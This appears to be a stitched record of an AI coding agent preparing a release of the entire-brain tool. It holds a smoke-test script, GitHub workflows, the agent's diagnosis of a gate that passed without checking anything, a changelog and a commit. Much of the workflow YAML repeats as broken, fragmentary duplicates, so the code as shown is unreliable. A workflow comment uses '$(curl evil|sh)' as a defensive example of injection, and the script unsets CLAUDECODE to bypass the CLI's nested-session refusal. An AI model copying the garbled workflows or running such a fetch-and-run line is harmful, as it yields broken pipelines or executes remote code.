#!/bin/bash
#MISE description="Release smoke: full user journey on scratch repos (enable, capture, distill, recall, graph, hosted sync up/down)"
#
# A tripwire, not a test suite: one assert per leg, each fails loudly.
# Legs: 1 setup, 2 checkpoint capture, 3 distill, 4 recall, 5 graph query,
#        6 hosted upload (staging), 7 pull+merge on a second clone.
#
# The entire-brain binary under test is built from this checkout (the RC SHA);
# the host `entire` CLI and the entire-graph provider are the installed ones.
# Brain state is isolated per "machine" via ENTIRE_PLUGIN_*_DIR, like
# scripts/hosted-sync-smoke.sh; HOME and the host CLI's login stay real because
# legs 3 and 6 need the real coding agent and the real staging auth.
#
# Environment the runner must export (legs 6-7; never hardcode secrets):
#   REPO_ID       region-local repo ULID of a STAGING brainstore repo
#   API_URL       that repo's home-cell base URL, e.g. https://<home-cell>.api.partial.to/api/v1
#   AUTH_CONTEXT  optional saved `entire auth` login to mint the token from
#                 (e.g. us.auth.partial.to); default: the active context
#   ENTIRE_BRAIN_BIN  optional prebuilt entire-brain binary (skips go build)
#
# Evidence: a timestamped pass/fail summary (with brain/graph/host versions)
# is written under .smoke-evidence/ with host paths redacted.
set -euo pipefail

repo_root=$(git rev-parse --show-toplevel)
evidence_dir=${SMOKE_EVIDENCE_DIR:-"$repo_root/.smoke-evidence"}
stamp=$(date +%Y%m%d-%H%M%S)
evidence="$evidence_dir/release-smoke-$stamp.md"

REPO_ID=${REPO_ID:?export REPO_ID (staging brainstore repo ULID) -- see header}
API_URL=${API_URL:?export API_URL (staging cell base URL) -- see header}

# Hosted sync fails closed under the egress kill switch; this suite exists to
# exercise egress, so both spellings must be unset.
unset ENTIRE_BRAIN_NO_EGRESS ENTIRE_BRAIN_LOCAL_ONLY
# The claude CLI refuses to start inside another Claude Code session and names
# unsetting CLAUDECODE as the bypass. Distill's child is non-interactive
# (--print), so the bypass is safe; a normal terminal never has this set.
unset CLAUDECODE

command -v git >/dev/null || { echo "FATAL: git is required" >&2; exit 1; }
command -v entire >/dev/null || { echo "FATAL: the entire CLI is required" >&2; exit 1; }
command -v python3 >/dev/null || { echo "FATAL: python3 is required" >&2; exit 1; }
if ! command -v claude >/dev/null && ! command -v codex >/dev/null; then
  echo "FATAL: leg 3 (distill) needs a coding agent on PATH (claude or codex)" >&2
  exit 1
fi

# Released CLIs can print an update banner on stdout; the token is the last
# non-empty line (same rule as the plugin's mintHostedToken).
last_line() { awk 'NF {line=$0} END {print line}'; }
if [ -n "${AUTH_CONTEXT:-}" ]; then
  ENTIRE_TOKEN=$(entire auth token --context "$AUTH_CONTEXT" | last_line)
else
  ENTIRE_TOKEN=$(entire auth token | last_line)
fi
export ENTIRE_TOKEN

work=$(mktemp -d)
smoke_branch="smoke-$stamp"
scratch="$work/a"
clone_b="$work/b"

declare -a leg_names=(
  "1 setup: enable + brain setup healthy"
  "2 capture: commit writes a checkpoint"
  "3 distill: real agent writes >=1 fact"
  "4 recall: distilled fact comes back"
  "5 graph: fixture symbol resolves"
  "6 upload: hosted sync up, fact visible remotely"
  "7 pull: second clone pulls + merges the fact"
)
declare -a leg_status=(not-run not-run not-run not-run not-run not-run not-run)
current_leg=0

versions() {
  printf -- '- host CLI: %s\n' "$(entire version 2>/dev/null | head -n 1)"
  printf -- '- entire-brain (under test): %s\n' "$("$brain_bin" version 2>/dev/null || echo unknown)"
  printf -- '- entire-graph: %s\n' "$(entire graph version --json 2>/dev/null || echo unknown)"
}

name: test

on:
  push:
    branches: [main]
    # Release evidence is proved on the tag you actually ship from. Before
    # this, the repo had NO release-time evidence check at all: the gate ran
    # only on pushes to main, so a tag could be cut without its proof ever
    # being verified at the point it is published.
    tags: ["v*"]
  pull_request:
  # So anyone can ask "is the evidence release-ready?" without cutting a tag.
  workflow_dispatch:

permissions:
  contents: read

jobs:
  lint:
    runs-on: depot-ubuntu-24.04-4
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af # Official current-main v7.0.0 bundle with the repeated-DOCTYPE parser fix.
        with: { go-version: "1.27.2" }
      - run: go vet ./...
      - name: Test browser controller request lifetimes
        run: node --test webui/tests/*.test.cjs
      - uses: actions/setup-python@v7
        with: { python-version: "3.14" }
      - run: python3 -m pip install coverage==7.16.1
      - run: python3 -B -m unittest discover -s tools/coverage -p 'test_*.py'
      - run: python3 -B -m unittest discover -s tools/release-hygiene -p 'test_*.py'
      # The adapters are only meaningful against the frameworks they adapt, so
      # CI installs them. Without them the suite still runs and skips those
      # cases, which would quietly assert nothing.
      - run: python3 -m pip install langchain-core==1.6.4 llama-index-core==0.14.25
      - run: python3 -B -m unittest discover -s sdk/python/tests -p 'test_*.py'
      - run: |
          unformatted=$(gofmt -l -s .)
          if [ -n "$unformatted" ]; then
            echo "::error::unformatted files:"
            echo "$unformatted"
            exit 1
          fi

  browser-smoke:
    runs-on: depot-ubuntu-24.04-4
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af
        with: { go-version: "1.27.2" }
      - uses: actions/setup-node@v7
        with: { node-version: "22" }
      - run: npm ci --prefix webui --ignore-scripts
      - run: npm exec --prefix webui -- playwright install --with-deps chromium
      - run: go build -o "$RUNNER_TEMP/entire-brain" ./cmd/entire-brain
      - name: Exercise the embedded UI in Chromium
        run: BRAIN_VIZ_BINARY="$RUNNER_TEMP/entire-brain" npm --prefix webui run test:browser
      - uses: actions/upload-artifact@v7

          name: browser-smoke-traces
          path: webui/test-results/

    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af
        with: { go-version: "1.27.2" }

    runs-on: depot-ubuntu-24.04-4

        run: go build ./...

    strategy:
      matrix:

            runner: depot-macos-26

    timeout-minutes: 45
    steps:

        with:
          name: coverage-default-${{ matrix.os }}

            ${{ runner.temp }}/brain-coverage/*.jsonl

        with:
          go-version: "1.27.2"
          cache-dependency-path: go.sum
      - uses: actions/setup-python@v7
        with:
          python-version: "3.12"
      - name: Validate the Windows sharding harness
        run: python -B -m unittest discover -s tools/ci-bench/windows-production/tests -p "test_*.py" -v
      - name: Compile once and inventory default-runnable roots
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          $repository = (Resolve-Path -LiteralPath '.').Path

content.content:
name: release

on:
  workflow_dispatch:
    inputs:
      version:
        description: "Version to release (e.g. v0.1.0). Defaults to the pushed tag."
        required: false
        type: string
  pull_request:
    paths:
      - .github/workflows/release.yml
  push:
    tags:
      - "v*"

permissions:
  contents: read

# A tag push and a nightly dispatch can target the same version. Serialize them
# so the second completes the existing release in place instead of racing it.
concurrency:
  # Key on the version being released, not on ref_name: for a tag push
  # ref_name is the tag, but for a dispatch it is the branch, so the two runs
  # this is meant to serialize would land in different groups and race to
  # create the same release.
  group: release-${{ inputs.version || github.ref_name }}
  cancel-in-progress: false

jobs:
  build:
    name: build
    runs-on: ubuntu-24.04
    outputs:
      bare: ${{ steps.v.outputs.bare }}
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false

      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af # Official current-main v7.0.0 bundle with the repeated-DOCTYPE parser fix.
        with:
          go-version: "1.27.x"

      # Brain is pure Go: modernc sqlite is the only driver (the brain_cgo
      # variant was removed with semantic retrieval, trail #278). Every target
      # cross-compiles from one runner, and released binaries need no C
      # toolchain on the user's machine. This guard keeps it that way.
      - name: Verify the default build needs no cgo
        run: |
          set -euo pipefail
          CGO_ENABLED=0 go build -o /dev/null ./cmd/entire-brain
          echo "default build is pure Go"

      - name: Resolve version
        id: v
        env:
          # Never interpolate a workflow input straight into a run: block. The
          # expression is substituted as text before the shell parses it, so a
          # dispatch value like $(curl evil|sh) would execute on the runner.
          VERSION_INPUT: ${{ inputs.version }}
        run: |
          set -euo pipefail
          if [[ "${GITHUB_REF_TYPE}" == "tag" ]]; then
            version="${GITHUB_REF_NAME}"
          elif [[ -n "${VERSION_INPUT}" ]]; then
            version="${VERSION_INPUT}"
          else
            version="v0.0.0-dev.$(git rev-parse --short HEAD)"
          fi
          # A version reaches tag names, file names and release titles. Pin its
          # shape rather than trusting whatever was dispatched.
          if [[ ! "$version" =~ ^v[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$ ]]; then
            echo "::error::refusing to build an unrecognised version: ${version}"
            exit 1
          fi
          echo "version=${version}" >> "$GITHUB_OUTPUT"
          echo "bare=${version#v}" >> "$GITHUB_OUTPUT"
          echo "building ${version}"

      - name: Build every target
        env:
          VERSION: ${{ steps.v.outputs.version }}
          BARE: ${{ steps.v.outputs.bare }}
        run: |
          set -euo pipefail
          mkdir -p dist
          targets="linux/amd64 linux/arm64 darwin/amd64 darwin/arm64 windows/amd64 windows/arm64"
          for t in $targets; do
            goos="${t%/*}"; goarch="${t#*/}"
            out="entire-brain"
            [[ "$goos" == windows ]] && out="entire-brain.exe"
            echo "==> $goos/$goarch"
            CGO_ENABLED=0 GOOS="$goos" GOARCH="$goarch" \
              go build -trimpath -ldflags "-s -w -X main.version=${BARE}" \
              -o "dist/$out" ./cmd/entire-brain
            asset="entire-brain_${BARE}_${goos}_${goarch}"
            if [[ "$goos" == windows ]]; then
              (cd dist && zip -q "${asset}.zip" "$out" && rm "$out")
            else
              (cd dist && tar -czf "${asset}.tar.gz" "$out" && rm "$out")
            fi
          done
          (cd dist && sha256sum * > checksums.txt)
          ls -la dist

      - uses: actions/upload-artifact@v7
        with:
          name: release-dist
          path: dist/
          retention-days: 7

  # Cross-compiling from one runner means nothing on the release path ever
  # executes a Windows binary, and test.yml's Windows suite runs CGO_ENABLED=1
  # for the race detector — not the pure-Go configuration that ships. This job
  # tests that shipped configuration and smoke-runs the exact windows/amd64
  # artifact the release will carry. publish requires it, so a release cannot
  # ship untested Windows binaries. windows/arm64 is still only cross-compiled:
  # no amd64 runner can execute it.
  windows-verify:
    name: verify windows
    needs: build
    # Depot, like every other Windows job in this repo: hosted windows-latest
    # is 2-core for private repos and could not finish internal/cli (1,700+
    # test roots in one binary) inside 50 minutes. This does put a Depot
    # dependency on the publish path; during a Depot outage, releases wait.
    runs-on: depot-windows-2025-8
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false

      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af # Official current-main v7.0.0 bundle with the repeated-DOCTYPE parser fix.
        with:
          go-version: "1.27.x"

      - name: Test the shipped pure-Go configuration
        shell: pwsh
        env:
          CGO_ENABLED: "0"
        run: |
          $ErrorActionPreference = 'Stop'
          # internal/cli runs as a precompiled binary we own, not under go test:
          # its tests re-exec os.Executable() to spawn detached workers, and a
          # worker outliving the suite keeps cli.test.exe mapped on Windows, so
          # go test's own temp cleanup fails the run with "unlinkat: Access is
          # denied" after every test passed. The per-PR Windows harness runs the
          # compiled binary directly for the same reason. The runner is
          # ephemeral, so nobody needs to delete our copy.
          $pkgs = (go list ./...) | Where-Object { $_ -notmatch '/internal/cli$' }
          go test -timeout 20m $pkgs
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
          go test -c -o "$env:RUNNER_TEMP/cli.test.exe" ./internal/cli
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
          Push-Location internal/cli
          # Quoted and =-joined: pwsh splits a bare -test.timeout=25m at the dot,
          # and a space-separated value leaks into os.Args as a positional that at
          # least one test (parsing os.Args through cobra) trips over.
          & "$env:RUNNER_TEMP/cli.test.exe" '-test.timeout=25m'
          $code = $LASTEXITCODE
          Pop-Location
          exit $code

      - uses: actions/download-artifact@v8
        with:
          name: release-dist
          path: dist

      - name: Smoke-run the released windows/amd64 binary
        shell: pwsh
        env:
          BARE: ${{ needs.build.outputs.bare }}
        run: |
          $ErrorActionPreference = 'Stop'
          Expand-Archive -LiteralPath "dist/entire-brain_${env:BARE}_windows_amd64.zip" -DestinationPath "$env:RUNNER_TEMP/release-windows"
          tools/windows-sanity.ps1 -Binary "$env:RUNNER_TEMP/release-windows/entire-brain.exe"

  publish:
    name: publish
    needs: [build, windows-verify]
    # Only a real tag publishes. A pull_request run proves the build still works
    # without creating a release.
    if: github.event_name != 'pull_request'
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false

      - uses: actions/download-artifact@v8
        with:
          name: release-dist
          path: dist

      - name: Create or update the release
        env:
          GH_TOKEN: ${{ github.token }}
          VERSION_INPUT: ${{ inputs.version }}
        run: |
          set -euo pipefail
          if [[ "${GITHUB_REF_TYPE}" == "tag" ]]; then
            version="${GITHUB_REF_NAME}"
          else
            version="${VERSION_INPUT}"
          fi
          [[ -n "$version" ]] || { echo "no version to publish" >&2; exit 1; }
          if [[ ! "$version" =~ ^v[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$ ]]; then
            echo "::error::refusing to publish an unrecognised version: ${version}"
            exit 1
          fi

          mapfile -t assets < <(find dist -type f | sort)
          if gh release view "$version" --repo "$GITHUB_REPOSITORY" >/dev/null 2>&1; then
            echo "release $version exists — updating assets in place"
            gh release upload "$version" "${assets[@]}" --clobber --repo "$GITHUB_REPOSITORY"
          else
            gh release create "$version" "${assets[@]}" \
              --repo "$GITHUB_REPOSITORY" \
              --title "$version" \
              --generate-notes
          fi

  push:

      - "v*"

permissions:
  contents: read

# so the second completes the existing release in place instead of racing it.

  # Key on the version being released, not on ref_name: for a tag push
  # ref_name is the tag, but for a dispatch it is the branch, so the two runs
  # this is meant to serialize would land in different groups and race to
  # create the same release.

      # variant was removed with semantic retrieval, trail #278). Every target
      # cross-compiles from one runner, and released binaries need no C
      # toolchain on the user's machine. This guard keeps it that way.

          set -euo pipefail
          CGO_ENABLED=0 go build -o /dev/null ./cmd/entire-brain
          echo "default build is pure Go"

      - name: Resolve version
        id: v
        env:
          # Never interpolate a workflow input straight into a run: block. The
          # expression is substituted as text before the shell parses it, so a
          # dispatch value like $(curl evil|sh) would execute on the runner.
          VERSION_INPUT: ${{ inputs.version }}
        run: |
          set -euo pipefail
          if [[ "${GITHUB_REF_TYPE}" == "tag" ]]; then
            version="${GITHUB_REF_NAME}"
          elif [[ -n "${VERSION_INPUT}" ]]; then
            version="${VERSION_INPUT}"

            version="v0.0.0-dev.$(git rev-parse --short HEAD)"

            exit 1

          echo "version=${version}" >> "$GITHUB_OUTPUT"
          echo "bare=${version#v}" >> "$GITHUB_OUTPUT"
          echo "building ${version}"

      - name: Build every target
        env:
          VERSION: ${{ steps.v.outputs.version }}
          BARE: ${{ steps.v.outputs.bare }}
        run: |
          set -euo pipefail
          mkdir -p dist
          targets="linux/amd64 linux/arm64 darwin/amd64 darwin/arm64 windows/amd64 windows/arm64"
          for t in $targets; do
            goos="${t%/*}"; goarch="${t#*/}"
            out="entire-brain"
            [[ "$goos" == windows ]] && out="entire-brain.exe"

              -o "dist/$out" ./cmd/entire-brain

            else
              (cd dist && tar -czf "${asset}.tar.gz" "$out" && rm "$out")
            fi
          done
          (cd dist && sha256sum * > checksums.txt)
          ls -la dist

      - uses: actions/upload-artifact@v7

          name: release-dist
          path: dist/
          retention-days: 7

  # executes a Windows binary, and test.yml's Windows suite runs CGO_ENABLED=1

      - uses: actions/setup-go@90ad2b35f69faf97585ad74d28fa006d2739b7af # Official current-main v7.0.0 bundle with the repeated-DOCTYPE parser fix.

          # compiled binary directly for the same reason. The runner is
          # ephemeral, so nobody needs to delete our copy.

          exit $code

        with:
          name: release-dist
          path: dist

      - name: Smoke-run the released windows/amd64 binary
        shell: pwsh
        env:
          BARE: ${{ needs.build.outputs.bare }}
        run: |
          $ErrorActionPreference = 'Stop'
          Expand-Archive -LiteralPath "dist/entire-brain_${env:BARE}_windows_amd64.zip" -DestinationPath "$env:RUNNER_TEMP/release-windows"
          tools/windows-sanity.ps1 -Binary "$env:RUNNER_TEMP/release-windows/entire-brain.exe"

  publish:
    name: publish
    needs: [build, windows-verify]
    # Only a real tag publishes. A pull_request run proves the build still works
    # without creating a release.
    if: github.event_name != 'pull_request'
    runs-on: ubuntu-24.04
    permissions:

    steps:
      - uses: actions/checkout@v7

            echo "::error::refusing to publish an unrecognised version: ${version}"
            exit 1
          fi

          mapfile -t assets < <(find dist -type f | sort)

            echo "release $version exists — updating assets in place"

**Sweep done. Two release blockers; everything else is green.**

## Blocker 1: `mise run release:smoke` fails at leg 1

The end-to-end release gate failed today (it passed on 2026-10-23). Mechanism, confirmed by isolated reproduction:

- `entire-brain setup` writes the agent-wiring pointer files into the fresh scratch repo: `AGENTS.md` and `CLAUDE.md` (untracked) and edits `.claude/settings.json`.
- The status live-state dirty filter only exempts `.entire/` paths, so the seed freshness axis reports `dirty-unindexed` → severity `degraded` → `status --fail-on degraded` exits 1, which is exactly leg 1's assertion.
- PR #482 exempted agent hook configs from the *seeding* dirty gate, but the *status freshness* computation has no exemption, and `AGENTS.md`/`CLAUDE.md` are on no list at all.

One thing I could not resolve: the failure reproduces identically with **both** the HEAD binary and the shipped **v0.2.0** binary, while the host CLI (0.11.6, installed Oct 20), the smoke script's leg 1, and the global gitignore are all unchanged since the 10-23 green run. So I can't explain why it was green then — if you remember anything different about that run's environment, that would settle it. Either way, the gate is red right now and will block the release until either the freshness check exempts setup-authored wiring files (the #482 membership rule) or the smoke commits them. Evidence: `.smoke-evidence/release-smoke-20261025-220455.md`.

## Blocker 2: tag-time `release-evidence` CI job will fail — 3 stale lanes

This job only runs when you push the `v*` tag, so current green CI doesn't show it. I ran the full audit locally (CI's exact commands, Python 3.14): **9 failures** across:

- **Radar tool-contract evidence** — stale hashes for `retrieve*.go`, `regression*.go`, `mcp*.go`, `workspace*.go`
- **distill-perf** and **distill-perf-large** — stale hashes for `distill*.go` / `distill_cmd*.go` and their tests

These files changed in merges since the last re-record. Per the workflow's own instructions: re-record on a representative machine (`mise run radar:evidence:update`, distill-perf regeneration with timed runs) and commit manifests + reports before tagging. All other lanes (replay-lab, clean proof, Radar agent-lift, workspace Radar, facts eval, release matrix, benchmark harness) pass.

## Everything else passed

- `go test ./... -count=1` (full, uncached) — pass
- `gofmt -l -s`, `go vet`, `mise run lint` (incl. shellcheck, gomod) — clean
- All 6 release build targets cross-compile, including `windows/arm64` and the pure-Go `CGO_ENABLED=0` guard
- Mutation check, webui Node tests, tools/coverage, release-hygiene, Python SDK suites — pass (release-hygiene only fails on this machine's default Python 3.9; CI's 3.14 passes — not a blocker)
- CI on main: last 10 runs green; nightlies green; last release run (v0.2.0) green

Recorded both findings as a durable Brain memory (`project.release.gotcha`). One session-level note: Brain/Graph preflights ran clean except a stale brain manifest warning (`entire brain refresh` would clear it); recall found no prior release-checklist facts, so the gate list above came from the repo's workflows directly.

**The issue** (confirmed in code and by isolated repro):

1. `entire-brain setup` installs agent wiring: it creates `AGENTS.md` and `CLAUDE.md` pointer files and adds a PreToolUse hook entry to `.claude/settings.json` (`internal/cli/agent_wiring.go:79` — runs unconditionally inside setup since 350756ed, Oct 11).
2. The status live-state check reads `git status` and filters out only brain-ignored paths — `.entire/` plus `.brainignore` entries (`internal/cli/agent_surface.go:4940`). Setup's own three wiring files are not on any exemption list, so the tree reads dirty.
3. Dirty tree → seed freshness axis `dirty-unindexed` → severity `degraded` (`internal/cli/semantic.go:2394`) → `status --fail-on degraded` exits 1, which is exactly leg 1's assertion.

So setup dirties the tree and then its own health check flags the dirt — the same bug class PR #482 fixed for the *seeding* gate (hook configs exempted there) and an earlier fix handled for `.entire/logs/entire.log` in the live-state filter. The freshness path never got the same treatment for the wiring files.

**Why it's not a new code regression:** I rebuilt the binary from the v0.2.0 tag and ran the identical scenario — it fails the same way. Host CLI (0.11.6, installed Oct 20), git, graph provider (v0.5.0), and the smoke script's leg 1 are all unchanged since the Oct 23 green run.

**When/why it was ever green** is the open thread — with everything above unchanged, the Oct 23 pass is unexplained by code or environment. I have an agent pulling that session's actual transcript from Entire history right now to see what leg 1 really printed then (and whether the green run differed in some input). I'll report what it finds.

**Remedy, verified:** committing the three setup-written files after `setup` makes `status --fail-on degraded` pass. So the fix is either a one-line smoke change (commit setup's wiring output before the leg-1 assert) or, more correctly, exempting setup-authored wiring files from the live-state dirty computation under the same membership rule as #482 — "Entire's own installer writes it, so it is config, not source." content.text:
**Solved — the full story, verified end to end.**

## What the issue is

Three latent defects stack:

1. **Setup dirties the tree it then grades.** `entire-brain setup` writes `AGENTS.md`, `CLAUDE.md`, and a PreToolUse hook into `.claude/settings.json` (`internal/cli/agent_wiring.go:79`). The live-state dirty check exempts only brain-ignored paths (`agent_surface.go:4940`), so those files make the seed axis `dirty-unindexed` and retrieval freshness `degraded`. This has been true since wiring moved into setup (Oct 11) — **including during the green runs**.

2. **The gate passes vacuously without the graph provider.** `brainStatusFreshnessSeverity` (`agent_surface.go:1197`) returns `""` when `report.Semantic.Freshness` is nil — and retrieval freshness is never consulted. So with no graph installed, `status --fail-on degraded` passes even though freshness is degraded. The code's own comment says the opposite ("a release gate cannot pass unless semantic indexing produced a freshness assessment"), so this is arguably its own bug.

3. **The smoke's isolation doesn't isolate the graph provider.** The brain reaches graph through the host CLI (`entire graph …`), which resolves the plugin from the real install — `ENTIRE_PLUGIN_*_DIR` doesn't cover it.

## When and why it flipped

The Oct 22 green runs (21:33–23:13 local, per the session transcript) printed `"semantic search unavailable — run entire plugin install graph"` in leg 1 — no graph on the machine, so defect 2 masked defect 1. **entire-graph v0.5.0 was installed at Oct 23 01:53** (plugin symlink timestamps), during the release wrap-up. From then on, semantic freshness exists, `worseFreshnessSeverity` merges the retrieval `degraded` in, and the gate trips.

Verified with a binary matrix: the last green RC (cb29e4c3), v0.2.0, and HEAD **all fail** with graph visible and **all pass** with graph hidden (shimmed `entire` failing the `graph` subcommand reproduces the Oct 22 console output byte-for-byte). No brain code change is involved.

## Implications

- Not a regression in the release candidate — safe to fix without suspecting recent merges.
- But real first-runs on machines **with** graph installed currently end on `freshness: degraded`, so defect 1 is worth fixing regardless: exempt setup-authored wiring files from the dirty computation (same membership rule as PR #482).
- Defect 2 deserves a decision: the gate silently weakening when graph is absent means the Oct 22 "7/7 PASS" was partially vacuous.
- Cheapest smoke unblock (verified): commit setup's wiring output in leg 1 before the status assert.

Recorded the resolved root cause as a durable Brain memory. Want me to fix any of the three (I'd start with the dirty-filter exemption + the smoke commit)?

# Changelog

All notable changes to `entire-brain` are recorded here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

## [Unreleased]

### Removed

- The one-time migrations for Brain's old code stores. Refresh, code inspection,
  and bundle operations now refuse old layouts with recovery instructions;
  status and doctor report the same problem. Run `entire brain refresh index`
  with entire-brain 0.2.0 once before upgrading to preserve runtime traces, or
  back up and remove the brain directory and refresh to rebuild. Legacy vector
  detection remains in place for health and privacy checks.

## [0.2.0] - 2026-10-23

### Removed

- The `init-agents` command. `setup` already ran the same installer; the
  command's two unique behaviors moved onto `setup`: `--strict` / `--normal`
  save the guidance mode, and the nested-repository warning prints before any
  phase runs. The agent wiring stays best-effort — a repository that will not
  accept the instruction files still gets a working brain and one warning
  naming a `setup` re-run as the repair. `agent-guide` remains the read-only
  preview. The removed command fails with an error naming `setup` as the
  replacement (#453).

- Semantic (embedding) memory retrieval. A 1,748-run agent eval measured BM25
  lexical ranking matching or beating the embedder stack end-to-end (see
  `docs/eval_ledger.md` and trail #278), so the Model2Vec vector arm is gone
  and the cgo build dependency was stripped (#416). BM25 lexical is the only
  ranking. `query --semantic`, `vsearch`, MCP `brain_vsearch`, and
  `recall --no-semantic` are accepted as no-op compatibility aliases that run
  the same BM25 ranking; `--semantic` and `vsearch` print a stderr notice.
  `entire brain capabilities --json` reports `semantic_compiled: false`.
  Graph's semantic code retrieval (`brain_code`, `brain_context`,
  `brain_impact`) is unaffected.

## [Unreleased]

### Removed

- The one-time migrations for Brain's old code stores. Refresh, code inspection,
  and bundle operations now refuse old layouts with recovery instructions;
  status and doctor report the same problem. Run `entire brain refresh index`
  with entire-brain 0.2.0 once before upgrading to preserve runtime traces, or
  back up and remove the brain directory and refresh to rebuild. Legacy vector
  detection remains in place for health and privacy checks.

### Fixed

- A first `setup` no longer ends on `freshness: degraded`. The agent wiring
  files setup itself writes — `AGENTS.md`, `CLAUDE.md`, and the PreToolUse
  entry in `.claude/settings.json` — no longer count as a dirty worktree in the
  live state report, the same exemption the dirty-worktree gate already
  applied. The files stay in the indexed corpus.

- `status --fail-on degraded` and `--fail-on unsafe` no longer pass without
  looking when the brain has no semantic assessment: a degraded or unsafe
  retrieval freshness now trips the gate even when no graph provider is
  installed. A healthy retrieval report still does not substitute for the
  missing assessment, so `--fail-on release` keeps failing on unindexed brains.

- `mise run release:smoke` leg 1 gates on `--fail-on release` instead of
  `--fail-on degraded`, so a runner without the entire-graph provider fails
  loudly ("freshness is unset") instead of passing a gate that assessed
  nothing — which is how the gate silently weakened on machines without the
  provider.

content.content:
root=$(git rev-parse --show-toplevel)
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT

echo "==> building entire-brain"
bin="$work/entire-brain"
(cd "$root" && go build -o "$bin" ./cmd/entire-brain)

run() { # run <machine> <checkout> <args...>
  local m=$1 dir=$2
  shift 2
  ENTIRE_PLUGIN_DATA_DIR="$work/$m/data" \
    ENTIRE_PLUGIN_STATE_DIR="$work/$m/state" \
    ENTIRE_PLUGIN_CONFIG_DIR="$work/$m/config" \
    ENTIRE_PLUGIN_CACHE_DIR="$work/$m/cache" \
    ENTIRE_REPO_ROOT="$dir" \
    "$bin" "$@"
}

echo "==> cloning checkouts A and B"
git clone -q "$root" "$work/a"
git clone -q "$root" "$work/b"

fact="hosted sync smoke $(date +%s)-$RANDOM: the two-machine loop works"

connect_args=(--repo-id "$REPO_ID" --api-url "$API_URL")

echo "==> machine A: connect"
run a "$work/a" connect "${connect_args[@]}"
echo "==> machine A: remember \"$fact\""
run a "$work/a" remember "$fact" --path project.testing.smoke --agent none
echo "==> machine A: publish (connect re-runs the sync)"
run a "$work/a" connect "${connect_args[@]}"

echo "==> machine B: connect (fresh clone; connect doubles as the first pull)"

content.thinking:
Now it's clear: the plugin directories nested in the repo pollute the tree with hundreds of brain-generated files, and the SEED component actually failed to build because it refused to seed over uncommitted content in a dirty worktree.

This confirms the real issue is the smoke test layout — the worktree gate doesn't exempt cache/data/state dirs since they're the smoke's mislocated state, not Entire-authored repo config. So even on green runs, seed failed to build silently, yet `--fail-on degraded` still passed vacuously since there was no graph to compute severity from — meaning the green gate was even more hollow than I thought, with the brain having no seed at all. The fix is to move the machine dirs outside the repo entirely, which matches my earlier faithful repro that passed the gate fully. Now I'm editing the smoke script to adjust directory layout...

I should also add a header comment noting state dirs must live beside, not inside, the repo since the brain's dirty gates read git status directly, and I need to check all other `$work/` and `$scratch` references for the same issue before rerunning the full smoke test. I'm also weighing whether hosted-sync-smoke.sh needs the same fix — it nests machine dirs inside clones too but doesn't assert status freshness, so it's lower priority, though keeping both scripts consistent would prevent this bug from recurring elsewhere.

I'll fix the release smoke script and leave hosted-sync-smoke.sh alone for now since it still works, keeping the diff minimal for this release, and just flag it as a follow-up in the PR description.

Found that the smoke env's seed component fails because per-machine state dirs sit inside the scratch repo, flooding git status — the same flaw that made Oct 22's "green" runs pass with no seed at all. Now fixing the smoke's sandbox layout to resolve this.

input.command:
git add CHANGELOG.md internal/cli/agent_surface.go internal/cli/semantic.go internal/cli/semantic_audit_test.go internal/cli/setup_firstrun_test.go mise-tasks/release/smoke
git commit -m "$(cat <<'EOF'
fix(status): stop setup failing its own freshness check, and stop the degraded gate passing blind

A first setup ended on "freshness: degraded": setup writes the agent
wiring (AGENTS.md, CLAUDE.md, the PreToolUse entry in
.claude/settings.json) after the user's last commit, and the live
dirtiness report counted those files as a dirty worktree while
worktreeDirty — the gate entireAuthoredGatePaths was built for — called
the identical tree clean. brainLiveStateReport now shares
worktreeGateIgnore, so the dirty verdict stops blaming the user for
files Entire wrote. The files stay in the indexed corpus.

The failure hid because `status --fail-on degraded` passed without
looking whenever no semantic assessment existed: a missing assessment
yielded severity "" and the retrieval severity was discarded with it,
so a brain without a graph provider had no freshness gating at all.
The release smoke validated v0.2.0 exactly that way — no provider on
the runner, leg 1 green over a tree whose seed had refused to build.
Installing the provider later turned the same tree red at leg 1.
brainStatusFreshnessSeverity now surfaces a degraded or unsafe
retrieval severity even without a semantic assessment; a healthy
retrieval report still never substitutes for the missing assessment,
so --fail-on release keeps failing on unindexed brains.

The smoke takes both lessons: leg 1 gates on --fail-on release so a
runner without the provider fails loudly instead of passing a gate
that assessed nothing, and the per-machine brain state dirs move
beside the scratch repo instead of inside it, where the brain's own
writes dirtied the tree and stopped the seed from building.
release:smoke passes 7/7 with all three fixes.

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>
EOF
)" 2>&1 | tail -3
